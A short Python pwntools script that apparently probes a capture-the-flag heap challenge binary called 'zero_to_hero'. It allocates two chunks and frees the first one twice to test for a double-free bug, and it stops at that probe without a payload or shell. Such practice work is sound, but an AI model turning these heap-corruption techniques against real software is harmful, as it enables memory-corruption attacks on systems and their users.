from pwn import *

def start():
    return process(["./ld-2.29.so", "./zero_to_hero"], env={"LD_PRELOAD": "./libc.so.6"})

p = start()
p.recvuntil(b"hero?\n")
p.sendline(b"y")
p.recvuntil(b"> ")

# add chunk 0
p.sendline(b"1")
p.recvuntil(b"description?\n")
p.sendline(b"64")
p.recvuntil(b"description: ")
p.send(b"A"*64)
p.recvuntil(b"> ")

# add chunk 1
p.sendline(b"1")
p.recvuntil(b"description?\n")
p.sendline(b"64")
p.recvuntil(b"description: ")
p.send(b"B"*64)
p.recvuntil(b"> ")

# free chunk 0
p.sendline(b"2")
p.recvuntil(b"remove?\n")
p.sendline(b"0")
p.recvuntil(b"> ")

# free chunk 1
p.sendline(b"2")
p.recvuntil(b"remove?\n")
p.sendline(b"1")
p.recvuntil(b"> ")

# free chunk 0 again (should double free?)
p.sendline(b"2")
p.recvuntil(b"remove?\n")
p.sendline(b"0")
print(p.recvline())
